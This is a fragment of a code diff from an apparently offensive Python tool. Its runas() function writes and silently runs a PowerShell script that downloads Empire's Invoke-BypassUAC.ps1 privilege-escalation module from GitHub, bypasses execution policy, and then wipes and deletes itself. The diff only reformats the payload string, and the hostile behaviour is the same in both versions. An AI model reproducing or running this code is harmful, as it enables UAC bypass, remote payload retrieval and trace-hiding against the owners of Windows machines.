@@ -3,12 +3,12 @@
 #Start
 
 def runas():
-	pscode  = '(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1","$pwd\Lolz.ps1")'
-	pscode += "\nfunction SelfDestruct() {"+"\n"
-	pscode += "$path = (Get-Variable MyInvocation -Scope 1).Value.MyCommand.Path"+"\n"
-	pscode += "Clear-Content $path"+"\n"
-	pscode += "Remove-Item $path}"+"\n"
-	pscode += "SelfDestruct"+"\n
+	pscode  = '''(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1","$pwd\Lolz.ps1")
+function SelfDestruct() {
+	$path = (Get-Variable MyInvocation -Scope 1).Value.MyCommand.Path
+	Clear-Content $path
+	Remove-Item $path }
+SelfDestruct'''
 	f=open("Lol.ps1","w");f.write(pscode);f.close()
 	blah = subprocess.Popen("PowerShell.exe -ExecutionPolicy Bypass -noprofile -File lol.ps1 >> NUL",shell=True)
 	filename = pth.split("\\")[-1]
